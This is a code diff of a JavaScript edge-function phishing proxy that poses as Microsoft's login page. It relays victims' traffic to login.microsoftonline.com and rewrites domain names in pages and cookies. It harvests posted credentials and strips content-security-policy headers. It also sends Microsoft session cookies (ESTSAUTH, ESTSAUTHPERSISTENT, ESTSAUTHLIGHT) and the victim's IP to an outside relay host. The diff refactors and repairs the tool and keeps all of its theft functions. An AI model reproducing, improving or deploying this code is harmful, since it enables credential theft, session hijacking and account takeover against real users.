@@ -1,29 +1,24 @@
-// Remove this line completely for Zeabur compatibility:
-// export const runtime = 'edge';
+export const runtime = 'edge';
 
-// Configuration
-const UPSTREAM = 'login.microsoftonline.com';
+// ==================== CONFIG ====================
+const UPSTREAM = 'login.microsoftonline.com';   // your test value
 const UPSTREAM_PATH = '/';
-const VERCEL_URL = 'https://relay-address.com/api/relay';
+const VERCEL_URL = 'https://vercelorisdns.duck.org/api/relay';
 const BLOCKED_REGIONS = [];
 const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];
+// ===============================================
 
-// ---- Exfiltration Functions ----
 async function sendCredsToVercel(data) {
-  if (!VERCEL_URL) return;
   try {
     await fetch(VERCEL_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(data),
     });
-  } catch (error) {
-    // Intentionally silent
-  }
+  } catch (e) {}
 }
 
 async function exfiltrateCookiesFile(cookieText, ip) {
-  if (!VERCEL_URL) return;
   try {
     const content = `IP: ${ip}\nData: Cookies found:\n\n${cookieText}\n`;
     const formData = new FormData();
@@ -31,34 +26,28 @@ async function exfiltrateCookiesFile(cookieText, ip) {
     formData.append("ip", ip);
     formData.append("type", "cookie-file");
 
-    await fetch(VERCEL_URL, {
-      method: "POST",
-      body: formData,
-    });
-  } catch (e) {
-    // Intentionally silent
-  }
+    await fetch(VERCEL_URL, { method: "POST", body: formData });
+  } catch (e) {}
 }
 
 async function handleProxy(request, pathSegments = []) {
   const url = new URL(request.url);
-
-  const region = request.headers.get('x-vercel-ip-country')?.toUpperCase() || '';
   const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
 
-  if (BLOCKED_REGIONS.includes(region) || BLOCKED_IPS.includes(ipAddress)) {
+  if (BLOCKED_IPS.includes(ipAddress)) {
     return new Response('Access denied.', { status: 403 });
   }
 
   const url_hostname = url.hostname;
   const upstream_domain = UPSTREAM;
 
+  // Build upstream URL
   const upstreamUrl = new URL(request.url);
   upstreamUrl.protocol = 'https:';
-  upstreamUrl.host = upstream_domain;
+  upstreamUrl.hostname = upstream_domain;
   upstreamUrl.port = '';
 
-  if (upstreamUrl.pathname === '/') {
+  if (upstreamUrl.pathname === '/' || upstreamUrl.pathname === '') {
     upstreamUrl.pathname = UPSTREAM_PATH;
   } else {
     upstreamUrl.pathname = UPSTREAM_PATH + upstreamUrl.pathname;
@@ -68,10 +57,11 @@ async function handleProxy(request, pathSegments = []) {
 
   const method = request.method;
   const new_request_headers = new Headers(request.headers);
-  new_request_headers.set('Host', upstream_domain);
-  new_request_headers.set('Referer', `https://${url_hostname}`);
 
-  // Credential harvesting on POST
+  new_request_headers.delete('Host');
+  new_request_headers.set('Referer', `https://${upstream_domain}`);
+
+  // Credential harvesting
   if (method === 'POST') {
     try {
       const temp_req = request.clone();
@@ -97,110 +87,98 @@ async function handleProxy(request, pathSegments = []) {
     }
   }
 
-  // ==================== MAIN UPSTREAM FETCH WITH ERROR HANDLING ====================
-  let original_response;
+  // ==================== MAIN FETCH ====================
   try {
-    original_response = await fetch(upstreamUrl.toString(), {
+    const fetchOptions = {
       method: method,
       headers: new_request_headers,
-      body: ["GET", "HEAD"].includes(method) ? null : request.body,
-      redirect: 'follow',
+    };
+
+    // Critical fix for Edge Runtime duplex error
+    if (!["GET", "HEAD"].includes(method)) {
+      fetchOptions.body = request.body;
+      fetchOptions.duplex = 'half';
+    }
+
+    let original_response = await fetch(upstreamUrl.toString(), fetchOptions);
+
+    // WebSocket passthrough
+    const connection_upgrade = new_request_headers.get("Upgrade");
+    if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
+      return original_response;
+    }
+
+    const original_response_clone = original_response.clone();
+    const new_response_headers = new Headers(original_response.headers);
+    const status = original_response.status;
+
+    new_response_headers.set('access-control-allow-origin', '*');
+    new_response_headers.set('access-control-allow-credentials', 'true');
+    new_response_headers.delete('content-security-policy');
+    new_response_headers.delete('content-security-policy-report-only');
+    new_response_headers.delete('clear-site-data');
+
+    // Cookie handling + exfil (including ESTSAUTHLIGHT)
+    let all_cookies = "";
+    try {
+      const originalCookies = (typeof new_response_headers.getAll === "function")
+        ? new_response_headers.getAll("Set-Cookie")
+        : (new_response_headers.get("Set-Cookie") ? [new_response_headers.get("Set-Cookie")] : []);
+
+      all_cookies = originalCookies.join("; \n\n");
+
+      originalCookies.forEach(originalCookie => {
+        const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
+        new_response_headers.append("Set-Cookie", modifiedCookie);
+      });
+    } catch (error) {
+      console.error('Cookie processing error:', error);
+    }
+
+    if (
+      (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) ||
+      all_cookies.includes('ESTSAUTHLIGHT')
+    ) {
+      await exfiltrateCookiesFile(all_cookies, ipAddress);
+    }
+
+    // Body rewriting
+    const content_type = new_response_headers.get('content-type');
+    let original_text;
+
+    if (content_type && /(text\/html|application\/javascript|application\/json)/i.test(content_type)) {
+      let text = await original_response_clone.text();
+      text = text.replace(/login\.microsoftonline\.com/g, url_hostname);
+      original_text = text;
+    } else {
+      original_text = original_response_clone.body;
+    }
+
+    return new Response(original_text, {
+      status,
+      headers: new_response_headers
     });
-  } catch (error) {
+
+  } catch (fetchError) {
     console.error('Upstream fetch failed:', {
       url: upstreamUrl.toString(),
       method,
-      errorName: error.name,
-      errorMessage: error.message,
-      cause: error.cause || null,
+      error: fetchError.message,
+      cause: fetchError.cause || null
     });
 
     return new Response(
-      JSON.stringify({ error: 'Proxy Error', message: 'Failed to reach upstream' }),
+      JSON.stringify({ error: "Proxy Error", message: "Failed to reach upstream" }),
       { status: 502, headers: { 'content-type': 'application/json' } }
     );
   }
-  // ============================================================================
-
-  // WebSocket handling
-  const connection_upgrade = new_request_headers.get("Upgrade");
-  if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
-    return original_response;
-  }
-
-  const original_response_clone = original_response.clone();
-  const new_response_headers = new Headers(original_response.headers);
-  const status = original_response.status;
-
-  new_response_headers.set('access-control-allow-origin', '*');
-  new_response_headers.set('access-control-allow-credentials', 'true');
-  new_response_headers.delete('content-security-policy');
-  new_response_headers.delete('content-security-policy-report-only');
-  new_response_headers.delete('clear-site-data');
-
-  // Cookie handling + exfiltration (including ESTSAUTHLIGHT)
-  let all_cookies = "";
-  try {
-    const originalCookies = (typeof new_response_headers.getAll === "function")
-      ? new_response_headers.getAll("Set-Cookie")
-      : (new_response_headers.get("Set-Cookie") ? [new_response_headers.get("Set-Cookie")] : []);
-
-    all_cookies = originalCookies.join("; \n\n");
-
-    originalCookies.forEach(originalCookie => {
-      const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
-      new_response_headers.append("Set-Cookie", modifiedCookie);
-    });
-  } catch (error) {
-    console.error('Cookie processing error:', error);
-  }
-
-  if (
-    (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) ||
-    all_cookies.includes('ESTSAUTHLIGHT')
-  ) {
-    await exfiltrateCookiesFile(all_cookies, ipAddress);
-  }
-
-  // Body rewriting for text-based content
-  const content_type = new_response_headers.get('content-type');
-  let original_text;
-
-  if (content_type && /(text\/html|application\/javascript|application\/json)/i.test(content_type)) {
-    let text = await original_response_clone.text();
-    text = text.replace(/login\.microsoftonline\.com/g, url_hostname);
-    original_text = text;
-  } else {
-    original_text = original_response_clone.body;
-  }
-
-  const response = new Response(original_text, {
-    status,
-    headers: new_response_headers
-  });
-
-  return response;
 }
 
-// Export handlers
-export async function GET(request, { params }) {
-  return handleProxy(request, params?.path || []);
-}
-export async function POST(request, { params }) {
-  return handleProxy(request, params?.path || []);
-}
-export async function PUT(request, { params }) {
-  return handleProxy(request, params?.path || []);
-}
-export async function DELETE(request, { params }) {
-  return handleProxy(request, params?.path || []);
-}
-export async function PATCH(request, { params }) {
-  return handleProxy(request, params?.path || []);
-}
-export async function OPTIONS(request, { params }) {
-  return handleProxy(request, params?.path || []);
-}
-export async function HEAD(request, { params }) {
-  return handleProxy(request, params?.path || []);
-}
+// Simplified handlers
+export const GET = handleProxy;
+export const POST = handleProxy;
+export const PUT = handleProxy;
+export const DELETE = handleProxy;
+export const PATCH = handleProxy;
+export const OPTIONS = handleProxy;
+export const HEAD = handleProxy;
